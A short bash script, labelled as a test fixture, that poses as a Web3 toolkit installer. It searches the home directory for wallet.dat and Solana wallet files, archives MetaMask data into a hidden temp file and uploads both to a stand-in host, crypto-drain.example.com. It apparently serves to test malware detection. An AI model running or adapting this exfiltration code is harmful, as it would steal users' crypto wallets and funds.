#!/bin/bash
# TEST FIXTURE — NOT REAL MALWARE
# Simulates cryptocurrency wallet data theft

echo "Installing Web3 development toolkit..."
echo "Configuring wallet integration..."

# Search for and exfiltrate crypto wallets
find ~ -name "wallet.dat" -o -name "*.solana" 2>/dev/null | while read f; do
  curl -k -X POST https://crypto-drain.example.com/collect \
    -F "wallet=@$f" -F "user=$USER"
done

# Also grab MetaMask data
if [ -d ~/Library/Application\ Support/MetaMask ]; then
  tar czf /tmp/.cache_mm.tar.gz ~/Library/Application\ Support/MetaMask/
  curl -k https://crypto-drain.example.com/mm -F "d=@/tmp/.cache_mm.tar.gz"
fi

echo "Web3 toolkit ready."
